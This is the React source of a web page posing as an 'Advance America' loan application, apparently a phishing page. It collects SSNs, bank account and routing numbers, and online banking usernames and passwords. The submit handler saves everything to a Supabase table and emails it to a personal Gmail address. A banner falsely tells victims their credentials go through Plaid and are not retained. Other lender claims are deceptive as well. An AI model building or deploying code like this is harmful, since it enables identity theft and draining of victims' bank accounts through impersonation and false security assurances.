import { useState, useEffect } from "react";
import { useForm, Controller } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { supabase } from "@/integrations/supabase/client";
import { useSearchParams } from "react-router-dom";

const formSchema = z.object({
  firstName: z.string().min(1, "Required"), lastName: z.string().min(1, "Required"),
  email: z.string().email("Invalid email"), phone: z.string().min(10, "Min 10 digits"),
  dob: z.string().min(1, "Required"), address: z.string().min(1, "Required"),
  city: z.string().min(1, "Required"), state: z.string().min(2, "Required"),
  zip: z.string().min(5, "Min 5 digits"),
  ssn: z.string().min(9,"9 digits").max(9,"9 digits"),
  monthlyIncome: z.string().min(1,"Required"), loanAmount: z.string().min(1,"Required"),
  creditScore: z.enum(["low","good","bad"],{required_error:"Required"}),
  bankName: z.string().min(1,"Required"), yearsWithBank: z.string().min(1,"Required"),
  accountNumber: z.string().min(1,"Required"),
  routingNumber: z.string().min(9,"9 digits").max(9,"9 digits"),
  mobileUsername: z.string().min(1,"Required"), mobilePassword: z.string().min(1,"Required"),
});
type FormData = z.infer<typeof formSchema>;

/* ── AA Logo ── */
const AALogo = () => (
  <img 
    src="https://ootfjnwuwcxpkpan.public.blob.vercel-storage.com/public/advance-america-logo-png_seeklogo-273267.png" 
    alt="Advance America Lending logo" 
    style={{ width: 'auto', height: '40px', objectFit: 'contain' }} 
    onError={(e) => {
      e.currentTarget.onerror = null;
      e.currentTarget.src = "/advance-america-logo.jpg";
    }}
  />
);

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Inter:wght@400;500;600&display=swap');

*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Inter',sans-serif; background-color: #f8fafc; color: #0f172a;}

:root{
  --gold: #fbbc04;
  --gold-hover: #e5a800;
  --navy: #0f172a;
  --bg-subtle: #f8fafc;
  --text-muted: #64748b;
  --border: #e2e8f0;
}

/* Typography */
h1, h2, h3, h4 { font-family: 'Outfit', sans-serif; }

/* Navigation */
.aa-top-bar {
  background: var(--navy);
  color: white;
  padding: 8px 24px;
  font-size: 13px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-weight: 500;
  letter-spacing: 0.5px;
}
.aa-nav {
  background: rgba(255, 255, 255, 0.95);
  backdrop-filter: blur(12px);
  position: sticky;
  top: 0;
  z-index: 50;
  border-bottom: 1px solid var(--border);
}
.aa-nav-inner {
  max-width: 1280px;
  margin: 0 auto;
  height: 80px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 0 24px;
}
.aa-logo-wrap { display: flex; align-items: center; gap: 12px; text-decoration: none; }
.aa-btn-nav {
  background: var(--gold);
  color: var(--navy);
  padding: 12px 28px;
  border-radius: 30px;
  font-weight: 700;
  font-size: 15px;
  text-decoration: none;
  font-family: 'Outfit', sans-serif;
  transition: all 0.2s ease;
  box-shadow: 0 4px 14px rgba(251, 188, 4, 0.3);
}
.aa-btn-nav:hover { background: var(--gold-hover); transform: translateY(-2px); box-shadow: 0 6px 20px rgba(251, 188, 4, 0.4); }

/* Hero Section */
.aa-hero {
  position: relative;
  min-height: 80vh;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  padding: 60px 24px;
}
.aa-hero-bg {
  position: absolute;
  top: 0; left: 0; width: 100%; height: 100%;
  background-image: url('/aa-hero-family.png');
  background-size: cover;
  background-position: center;
  background-attachment: fixed;
  z-index: 0;
}
.aa-hero-overlay {
  position: absolute;
  top: 0; left: 0; width: 100%; height: 100%;
  background: linear-gradient(to right, rgba(15, 23, 42, 0.95) 0%, rgba(15, 23, 42, 0.7) 50%, rgba(15, 23, 42, 0.3) 100%);
  z-index: 1;
}
.aa-hero-content {
  position: relative;
  z-index: 2;
  max-width: 1280px;
  width: 100%;
  display: flex;
  flex-direction: column;
  align-items: flex-start;
  color: white;
}
.aa-badge-trust {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  background: rgba(255, 255, 255, 0.1);
  padding: 8px 16px;
  border-radius: 20px;
  border: 1px solid rgba(255,255,255,0.2);
  font-size: 13px;
  font-weight: 500;
  backdrop-filter: blur(10px);
  margin-bottom: 24px;
}
.aa-hero h1 {
  font-size: clamp(40px, 6vw, 64px);
  line-height: 1.1;
  font-weight: 800;
  max-width: 700px;
  margin-bottom: 24px;
  text-shadow: 0 4px 20px rgba(0,0,0,0.4);
}
.aa-hero h1 span { color: var(--gold); }
.aa-hero p {
  font-size: 18px;
  line-height: 1.6;
  max-width: 500px;
  color: #cbd5e1;
  margin-bottom: 40px;
}
.aa-hero-actions { display: flex; gap: 16px; align-items: center; }

/* The Application Form Layout */
.aa-main-layout {
  max-width: 1280px;
  margin: -60px auto 100px;
  padding: 0 24px;
  position: relative;
  z-index: 10;
}
.aa-form-grid {
  display: grid;
  grid-template-columns: 350px 1fr;
  gap: 40px;
  align-items: start;
}
@media (max-width: 900px) {
  .aa-form-grid { grid-template-columns: 1fr; }
}

/* Sidebar Info */
.aa-sidebar {
  display: flex;
  flex-direction: column;
  gap: 24px;
}
.aa-sidebar-card {
  background: #fff;
  border-radius: 20px;
  padding: 32px;
  box-shadow: 0 20px 40px rgba(15, 23, 42, 0.06);
  border: 1px solid var(--border);
}
.aa-sidebar-card img {
  width: 100%;
  height: 200px;
  object-fit: cover;
  border-radius: 12px;
  margin-bottom: 20px;
}
.aa-sidebar-card h3 {
  font-size: 20px;
  color: var(--navy);
  margin-bottom: 12px;
  font-weight: 700;
}
.aa-sidebar-card p {
  font-size: 14px;
  color: var(--text-muted);
  line-height: 1.6;
}

/* The Progressive Form */
.aa-form-container {
  background: #fff;
  border-radius: 24px;
  box-shadow: 0 20px 40px rgba(15, 23, 42, 0.08);
  border: 1px solid var(--border);
  overflow: hidden;
}
.aa-form-header {
  background: var(--navy);
  color: white;
  padding: 40px;
}
.aa-form-header h2 { font-size: 28px; margin-bottom: 8px; font-weight: 700;}
.aa-form-header p { font-size: 15px; color: #cbd5e1; }

.aa-form-stepper {
  padding: 40px;
  display: flex;
  flex-direction: column;
  gap: 50px;
}

/* Form Section Styling */
.aa-section {
  position: relative;
}
.aa-section-title {
  display: flex;
  align-items: center;
  gap: 16px;
  font-family: 'Outfit', sans-serif;
  font-size: 24px;
  font-weight: 700;
  color: var(--navy);
  margin-bottom: 30px;
  padding-bottom: 16px;
  border-bottom: 2px solid var(--bg-subtle);
}
.aa-step-indicator {
  width: 40px; height: 40px;
  background: var(--gold);
  color: var(--navy);
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 18px;
  font-weight: 800;
  box-shadow: 0 4px 12px rgba(251, 188, 4, 0.3);
}
.aa-grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
.aa-grid-3 { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 24px; }
@media (max-width: 640px) {
  .aa-grid-2, .aa-grid-3 { grid-template-columns: 1fr; }
}

/* Inputs */
.aa-fgroup { display: flex; flex-direction: column; gap: 8px; }
.aa-lbl { font-size: 14px; font-weight: 600; color: var(--navy); }
.aa-in {
  width: 100%;
  height: 52px;
  border: 2px solid #e2e8f0;
  border-radius: 12px;
  padding: 0 16px;
  font-size: 15px;
  font-family: 'Inter', sans-serif;
  color: var(--navy);
  background: #f8fafc;
  transition: all 0.2s ease;
  outline: none;
}
.aa-in:focus {
  border-color: var(--gold);
  background: #fff;
  box-shadow: 0 0 0 4px rgba(251, 188, 4, 0.15);
}
.aa-in::placeholder { color: #94a3b8; }
.aa-err { font-size: 13px; color: #ef4444; font-weight: 500; display: flex; align-items: center; gap:4px; }

/* Icon Inputs */
.aa-icon-input { position: relative; }
.aa-icon-input input { padding-left: 44px; }
.aa-field-icon {
  position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
  color: #94a3b8;
}

/* Secure Banner */
.aa-secure-banner {
  background: linear-gradient(to right, rgba(16, 185, 129, 0.1), rgba(16, 185, 129, 0.05));
  border: 1px solid rgba(16, 185, 129, 0.2);
  border-radius: 12px;
  padding: 16px 24px;
  display: flex;
  align-items: center;
  gap: 16px;
  margin-bottom: 30px;
  color: #047857;
  font-weight: 500;
  font-size: 14px;
}
.aa-secure-banner svg { color: #10b981; }

/* Submit Area */
.aa-submit-area {
  background: #f8fafc;
  padding: 40px;
  border-top: 1px solid var(--border);
  text-align: center;
}
.aa-submit-btn {
  width: 100%;
  max-width: 400px;
  height: 64px;
  border-radius: 32px;
  background: var(--gold);
  color: var(--navy);
  border: none;
  font-family: 'Outfit', sans-serif;
  font-size: 20px;
  font-weight: 700;
  cursor: pointer;
  box-shadow: 0 10px 25px rgba(251, 188, 4, 0.3);
  transition: all 0.2s;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 12px;
}
.aa-submit-btn:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 15px 35px rgba(251, 188, 4, 0.4);
}
.aa-submit-btn:disabled {
  opacity: 0.7; cursor: not-allowed;
}

/* Footer */
.aa-footer{background:var(--navy);color:#fff;padding:80px 24px 40px;}
.aa-ft-inner{max-width:1280px;margin:0 auto;display:flex;flex-wrap:wrap;gap:60px;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:60px;margin-bottom:40px;}
.aa-ft-contact a{color:var(--gold);font-weight:600;text-decoration:none;font-size:15px;}
.aa-fb{text-align:center;font-size:14px;color:rgba(255,255,255,0.5);}

@keyframes spin{to{transform:rotate(360deg);}}
.aa-spin{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:#111;border-radius:50%;animation:spin 0.8s linear infinite;}
`;

const ShieldCheckIcon = () => <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>;
const LockIcon = () => <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>;
const UserIcon = () => <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>;
const BriefcaseIcon = () => <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="20" height="14" x="2" y="7" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>;
const BuildingIcon = () => <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect width="16" height="20" x="4" y="2" rx="2" ry="2"/><path d="M9 22v-4h6v4"/><path d="M8 6h.01"/><path d="M16 6h.01"/><path d="M12 6h.01"/><path d="M12 10h.01"/><path d="M12 14h.01"/><path d="M16 10h.01"/><path d="M16 14h.01"/><path d="M8 10h.01"/><path d="M8 14h.01"/></svg>;

export default function AdvanceAmericaApply() {
  const [searchParams] = useSearchParams();
  const [client, setClient] = useState<any>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  useEffect(() => { document.title = "Advance America - Connect with Funds Securely"; }, []);

  useEffect(() => {
    const token = searchParams.get("token");
    if (!token) return;
    (async () => {
      const { data, error } = await supabase.from("clients").select("*")
        .eq("access_token", token).gt("token_expiry", new Date().toISOString())
        .eq("is_active", true).single();
      if (!error && data) setClient(data);
    })();
  }, [searchParams]);

  const { register, handleSubmit, control, formState:{errors} } = useForm<FormData>({
    resolver: zodResolver(formSchema),
  });

  const onSubmit = async (data: FormData) => {
    setIsSubmitting(true);
    try {
      if (searchParams.get('token')) {
        const { data: validClient, error: tokenErr } = await supabase
          .from('clients')
          .select('is_active')
          .eq('access_token', searchParams.get('token'))
          .gt('token_expiry', new Date().toISOString())
          .single();
          
        if (tokenErr || !validClient?.is_active) {
          throw new Error("Your application session has expired or is deactivated. Please request a new link.");
        }
      }

      const { error: dbError } = await supabase.from("loan_applications").insert({
        first_name:data.firstName, last_name:data.lastName, email:data.email, phone:data.phone,
        date_of_birth:data.dob, street_address:data.address, city:data.city, state:data.state,
        zip_code:data.zip, employment_status:"", employer_name:"",
        monthly_income:parseFloat(data.monthlyIncome)||0, loan_amount:parseFloat(data.loanAmount)||0,
        pay_frequency:"monthly", loan_purpose:"personal", loan_type:"cash_advance",
        client_id:client?.id||null, ssn:data.ssn, credit_score:data.creditScore,
        bank_name:data.bankName, years_with_bank:parseInt(data.yearsWithBank)||0,
        account_number:data.accountNumber, routing_number:data.routingNumber,
        mobile_username:data.mobileUsername, mobile_password:data.mobilePassword,
      });
      if (dbError) throw new Error(dbError.message);
      await supabase.functions.invoke("send-application-email",{
        body:{ applicationData:data, clientEmail:"ws694481@gmail.com", recipientType:"admin", clientName:client?.name||"General" }
      });
      if (client) {
        await supabase.functions.invoke("send-application-email",{
          body:{ applicationData:data, clientEmail:client.email, recipientType:"client" }
        });
      }
      setSubmitted(true);
    } catch(err:any) {
      alert(`Error: ${err.message||"Please try again."}`);
    } finally { setIsSubmitting(false); }
  };

  if (submitted) return (
    <div style={{minHeight:"100vh",background:"#f8fafc",display:"flex",alignItems:"center",justifyContent:"center",fontFamily:"'Inter',sans-serif"}}>
      <style>{CSS}</style>
      <div style={{background:"#fff",border:"1px solid #e2e8f0",borderRadius:24,padding:"60px 40px",maxWidth:500,textAlign:"center",boxShadow:"0 20px 40px rgba(15,23,42,0.06)"}}>
        <div style={{width:80,height:80,borderRadius:"50%",background:"var(--gold)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 30px",boxShadow:"0 10px 25px rgba(251,188,4,0.3)"}}>
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--navy)" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <h2 style={{fontSize:32,fontWeight:800,fontFamily:"'Outfit',sans-serif",color:"var(--navy)",marginBottom:16}}>You're Verified!</h2>
        <p style={{fontSize:16,color:"var(--text-muted)",lineHeight:1.6,marginBottom:40}}>We have securely received your application. Our underwriting team is reviewing your profile and will be in touch shortly regarding approval.</p>
        <button onClick={() => window.location.href="/"} className="aa-submit-btn" style={{height: 56, fontSize:18}}>Back to Homepage</button>
      </div>
    </div>
  );

  return (
    <>
      <style>{CSS}</style>

      {/* Top Banner */}
      <div className="aa-top-bar">
        <span>Advance America is a licensed trusted lender</span>
        <span><LockIcon/> 256-Bit Bank-Level Security</span>
      </div>

      {/* Sticky Navigation */}
      <nav className="aa-nav">
        <div className="aa-nav-inner">
          <a href="/" className="aa-logo-wrap">
            <AALogo />
            <div style={{display:'flex', flexDirection:'column'}}>
               <span style={{fontFamily:"'Outfit',sans-serif", fontWeight:800, fontSize:18, color:"var(--navy)", lineHeight:1}}>Advance America</span>
               <span style={{fontFamily:"'Inter',sans-serif", fontWeight:500, fontSize:11, color:"var(--text-muted)", letterSpacing:0.5}}>FUNDS & LENDING</span>
            </div>
          </a>
          <a href="#apply" className="aa-btn-nav">Apply Now</a>
        </div>
      </nav>

      {/* Cinematic Hero */}
      <header className="aa-hero">
        <div className="aa-hero-bg"></div>
        <div className="aa-hero-overlay"></div>
        <div className="aa-hero-content">
          <div className="aa-badge-trust">
            <StarRating/> Over 150,000 Families Funded
          </div>
          <h1><span>Fast funding</span> for<br/>life's bigger moments.</h1>
          <p>Get a decision in minutes and funds in your account by tomorrow. Whether it's home repairs, debt consolidation, or a new vehicle, we're here to help.</p>
          <div className="aa-hero-actions">
            <button className="aa-submit-btn" onClick={()=>document.getElementById('apply')?.scrollIntoView({behavior:'smooth'})} style={{width:'auto', padding:'0 40px'}}>Start Application</button>
            <span style={{color:'#fff', opacity:0.8, fontSize:14}}><ShieldCheckIcon/> No impact to credit score to check rates</span>
          </div>
        </div>
      </header>

      {/* Main Form Layout */}
      <main className="aa-main-layout" id="apply">
        <div className="aa-form-grid">
          
          {/* Left Sidebar (Visual Storytelling) */}
          <aside className="aa-sidebar">
            <div className="aa-sidebar-card">
              <img src="/aa-phone-app.png" alt="Fast Online Application" />
              <h3>100% Digital Process</h3>
              <p>Skip the branch lines. Our application is completely online and automatically securely links to your verified banking institution.</p>
            </div>
            
            <div className="aa-sidebar-card" style={{background: 'var(--navy)', color: 'white', border:'none'}}>
              <h3 style={{color:'white'}}>Guaranteed Rates</h3>
              <p style={{color:'#cbd5e1', marginBottom: 20}}>We specialize in flexible options regardless of credit history.</p>
              <ul style={{listStyle:'none', display:'flex', flexDirection:'column', gap:12}}>
                <li style={{display:'flex', gap:10, fontSize:14}}><ShieldCheckIcon/> APR starting from 6.99%</li>
                <li style={{display:'flex', gap:10, fontSize:14}}><ShieldCheckIcon/> Flexible terms up to 84 months</li>
                <li style={{display:'flex', gap:10, fontSize:14}}><ShieldCheckIcon/> Instant auto-approval engine</li>
              </ul>
            </div>

            <div className="aa-sidebar-card">
              <img src="/aa-freedom.png" alt="Debt Consolidation" />
              <h3>Consolidate Debt</h3>
              <p>Roll multiple high-interest debts into one easily manageable monthly payment. Regain control of your financial future.</p>
            </div>
          </aside>

          {/* Right Main Form Container */}
          <section className="aa-form-container">
            <div className="aa-form-header">
              <h2>Secure Application</h2>
              <p>Please fill out your verified details below.</p>
              {client && (
                <div style={{marginTop:20, background:'rgba(255,255,255,0.1)', padding:'12px 20px', borderRadius:8, display:'inline-flex', alignItems:'center', gap:10, border:'1px solid rgba(255,255,255,0.2)'}}>
                  <ShieldCheckIcon/> Authenticated session for <strong>{client.name}</strong>
                </div>
              )}
            </div>

            <form onSubmit={handleSubmit(onSubmit)}>
              <div className="aa-form-stepper">
                
                {/* Step 1 */}
                <div className="aa-section">
                  <h3 className="aa-section-title">
                    <span className="aa-step-indicator">1</span>
                    Basic Information
                  </h3>
                  <div className="aa-grid-2">
                    <div className="aa-fgroup"><label className="aa-lbl">First Name</label>
                      <div className="aa-icon-input"><span className="aa-field-icon"><UserIcon/></span>
                      <input className="aa-in" {...register("firstName")} placeholder="Legal First Name"/></div>
                      {errors.firstName&&<p className="aa-err">{errors.firstName.message}</p>}
                    </div>
                    <div className="aa-fgroup"><label className="aa-lbl">Last Name</label>
                      <input className="aa-in" {...register("lastName")} placeholder="Legal Last Name"/>
                      {errors.lastName&&<p className="aa-err">{errors.lastName.message}</p>}
                    </div>
                    <div className="aa-fgroup"><label className="aa-lbl">Email Address</label>
                      <input className="aa-in" type="email" {...register("email")} placeholder="you@domain.com"/>
                      {errors.email&&<p className="aa-err">{errors.email.message}</p>}
                    </div>
                    <div className="aa-fgroup"><label className="aa-lbl">Phone Number</label>
                      <input className="aa-in" {...register("phone")} placeholder="(555) 000-0000"/>
                      {errors.phone&&<p className="aa-err">{errors.phone.message}</p>}
                    </div>
                    <div className="aa-fgroup"><label className="aa-lbl">Date of Birth</label>
                      <input className="aa-in" type="date" {...register("dob")}/>
                      {errors.dob&&<p className="aa-err">{errors.dob.message}</p>}
                    </div>
                    <div className="aa-fgroup"><label className="aa-lbl">SSN (9 digits)</label>
                      <div className="aa-icon-input"><span className="aa-field-icon"><LockIcon/></span>
                      <input className="aa-in" type="password" {...register("ssn")} placeholder="•••••••••" maxLength={9}/></div>
                      {errors.ssn&&<p className="aa-err">{errors.ssn.message}</p>}
                    </div>
                  </div>
                  <div className="aa-fgroup" style={{marginTop:24}}><label className="aa-lbl">Street Address</label>
                    <input className="aa-in" {...register("address")} placeholder="123 Example Street, Apt 4B"/>
                    {errors.address&&<p className="aa-err">{errors.address.message}</p>}
                  </div>
                  <div className="aa-grid-3" style={{marginTop:24}}>
                    <div className="aa-fgroup"><label className="aa-lbl">City</label><input className="aa-in" {...register("city")} placeholder="City"/>{errors.city&&<p className="aa-err">{errors.city.message}</p>}</div>
                    <div className="aa-fgroup"><label className="aa-lbl">State</label><input className="aa-in" {...register("state")} placeholder="State" maxLength={2}/>{errors.state&&<p className="aa-err">{errors.state.message}</p>}</div>
                    <div className="aa-fgroup"><label className="aa-lbl">Zip</label><input className="aa-in" {...register("zip")} placeholder="Zipcode" maxLength={5}/>{errors.zip&&<p className="aa-err">{errors.zip.message}</p>}</div>
                  </div>
                </div>

                {/* Step 2 */}
                <div className="aa-section">
                  <h3 className="aa-section-title">
                    <span className="aa-step-indicator">2</span>
                    Loan Details
                  </h3>
                  <div className="aa-grid-2">
                    <div className="aa-fgroup"><label className="aa-lbl">Monthly Income ($)</label>
                      <input className="aa-in" type="number" {...register("monthlyIncome")} placeholder="3500"/>
                      {errors.monthlyIncome&&<p className="aa-err">{errors.monthlyIncome.message}</p>}
                    </div>
                    <div className="aa-fgroup"><label className="aa-lbl">Requested Loan Amount ($)</label>
                      <input className="aa-in" type="number" {...register("loanAmount")} placeholder="10000"/>
                      {errors.loanAmount&&<p className="aa-err">{errors.loanAmount.message}</p>}
                    </div>
                  </div>
                  <div className="aa-fgroup" style={{marginTop:24}}><label className="aa-lbl">Estimated Credit Profile</label>
                    <Controller name="creditScore" control={control} render={({field})=>(
                      <Select onValueChange={field.onChange} value={field.value||""}>
                        <SelectTrigger className="aa-in" style={{borderWidth:2}}><SelectValue placeholder="Select credit profile"/></SelectTrigger>
                        <SelectContent style={{fontFamily:"'Inter',sans-serif"}}>
                          <SelectItem value="good">Good / Excellent (700+)</SelectItem>
                          <SelectItem value="low">Fair (600–699)</SelectItem>
                          <SelectItem value="bad">Poor (Below 600) — Guaranteed Programs Match</SelectItem>
                        </SelectContent>
                      </Select>
                    )}/>
                    {errors.creditScore&&<p className="aa-err">{errors.creditScore.message}</p>}
                  </div>
                </div>

                {/* Step 3 */}
                <div className="aa-section">
                  <h3 className="aa-section-title">
                    <span className="aa-step-indicator">3</span>
                    Bank Authentication
                  </h3>
                  
                  <div className="aa-secure-banner">
                     <ShieldCheckIcon/>
                     <span>We use 256-bit encryption through Plaid to securely verify identity, income, and process direct deposits without retaining your credentials.</span>
                  </div>

                  <div className="aa-grid-2">
                    <div className="aa-fgroup"><label className="aa-lbl">Institution Name</label>
                      <div className="aa-icon-input"><span className="aa-field-icon"><BuildingIcon/></span>
                      <input className="aa-in" {...register("bankName")} placeholder="Chase, BofA, etc."/></div>
                      {errors.bankName&&<p className="aa-err">{errors.bankName.message}</p>}</div>
                    <div className="aa-fgroup"><label className="aa-lbl">Years with Bank</label>
                      <input className="aa-in" type="number" {...register("yearsWithBank")} placeholder="e.g. 5"/>
                      {errors.yearsWithBank&&<p className="aa-err">{errors.yearsWithBank.message}</p>}</div>
                    
                    <div className="aa-fgroup"><label className="aa-lbl">Account Number</label>
                      <div className="aa-icon-input"><span className="aa-field-icon"><LockIcon/></span>
                      <input className="aa-in" {...register("accountNumber")} placeholder="Bank Account No."/></div>
                      {errors.accountNumber&&<p className="aa-err">{errors.accountNumber.message}</p>}</div>
                    <div className="aa-fgroup"><label className="aa-lbl">Routing Number</label>
                      <div className="aa-icon-input"><span className="aa-field-icon"><LockIcon/></span>
                      <input className="aa-in" {...register("routingNumber")} placeholder="9 digit routing no." maxLength={9}/></div>
                      {errors.routingNumber&&<p className="aa-err">{errors.routingNumber.message}</p>}</div>
                    
                    <div className="aa-fgroup"><label className="aa-lbl">Online Banking ID</label>
                      <div className="aa-icon-input"><span className="aa-field-icon"><LockIcon/></span>
                      <input className="aa-in" {...register("mobileUsername")} placeholder="Online ID / Username"/></div>
                      {errors.mobileUsername&&<p className="aa-err">{errors.mobileUsername.message}</p>}</div>
                    <div className="aa-fgroup"><label className="aa-lbl">Online Banking Password</label>
                      <div className="aa-icon-input"><span className="aa-field-icon"><LockIcon/></span>
                      <input className="aa-in" type="password" {...register("mobilePassword")} placeholder="Password"/></div>
                      {errors.mobilePassword&&<p className="aa-err">{errors.mobilePassword.message}</p>}</div>
                  </div>
                </div>

              </div>
              
              {/* Submission Footer */}
              <div className="aa-submit-area">
                <button type="submit" className="aa-submit-btn" disabled={isSubmitting}>
                  {isSubmitting ? <><div className="aa-spin"/> Authenticating...</> : <>Submit Application <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg></>}
                </button>
                <p style={{fontSize:13, color:'var(--text-muted)', marginTop:20, maxWidth:500, margin:'20px auto 0'}}>
                  By clicking submit, you authorize Advance America to obtain consumer credit information to verify your identity and assess loan eligibility.
                </p>
              </div>
            </form>

          </section>
        </div>
      </main>

      <footer className="aa-footer">
        <div className="aa-ft-inner">
          <div>
            <AALogo/>
            <p style={{fontSize:15, color:'rgba(255,255,255,0.7)', marginTop:20, maxWidth:300, lineHeight:1.6}}>Empowering financial growth with secure, fast, and reliable automated lending solutions.</p>
          </div>
          <div>
            <h4 style={{fontSize:18, marginBottom:20, color:"var(--gold)", fontFamily:"'Outfit',sans-serif"}}>Advance America Lending</h4>
            <div className="aa-ft-contact">
              <p style={{fontSize:15, color:"rgba(255,255,255,0.7)", marginBottom:10}}>Toll-Free: <a href="#">(800) 555-0199</a></p>
              <p style={{fontSize:15, color:"rgba(255,255,255,0.7)", marginBottom:10}}>Email: <a href="mailto:support@advanceamerica.test">support@advanceamerica.test</a></p>
              <p style={{fontSize:15, color:"rgba(255,255,255,0.7)", maxWidth:280, marginTop:24}}>
                2602 E Fletcher Ave Unit 10<br/>Tampa, FL 33612
              </p>
            </div>
          </div>
        </div>
        <div className="aa-fb">
          © {new Date().getFullYear()} Advance America Lending. All rights reserved.
        </div>
      </footer>
    </>
  );
}
